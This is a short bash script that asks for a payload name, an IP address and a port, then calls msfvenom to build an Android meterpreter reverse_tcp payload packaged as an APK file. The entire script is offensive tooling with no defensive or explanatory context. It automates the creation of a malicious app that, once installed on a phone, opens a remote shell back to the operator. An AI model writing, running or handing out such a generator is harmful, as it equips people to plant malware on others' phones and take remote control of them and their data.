#!/bin/bash
green='\033[0;32m'
yellow='\033[0;33m'
echo -e $yellow
echo -n "Enter PAYLOAD name: "
read PAYLOAD 
echo -n "Enter Your IP: "
read IP
echo -n "Enter PORT No: "
read PORT 

xterm -T PAYLOAD -e msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $PAYLOAD.apk

